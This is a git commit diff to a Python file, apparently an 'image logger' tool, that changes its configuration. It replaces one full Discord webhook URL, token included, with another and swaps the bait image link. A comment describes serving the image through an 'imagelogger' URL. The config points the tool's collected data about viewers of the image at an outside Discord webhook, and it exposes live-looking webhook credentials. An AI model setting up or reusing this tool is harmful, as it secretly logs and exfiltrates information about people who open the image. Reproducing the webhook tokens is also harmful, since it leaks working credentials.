21fc436623c1b8f59a3c5a86edc6e8fcf40e1ae8
Arnavmessi10 <85062398+Arnavmessi10@users.noreply.github.com>
2025-05-30 12:40:54 +0530

    Update hmm.py

--- hmm/hmm.py
+++ hmm/hmm.py
@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-",
-    "image": "https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1377896862719414383/zNTvHUO7PO5aavJhp3j9AzsGr16p6_CsirX4hKIRGZn_tlIWwd_436RwqFBPMGIrVK0K",
+    "image": "https://thumbs.dreamstime.com/z/r-214795421.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
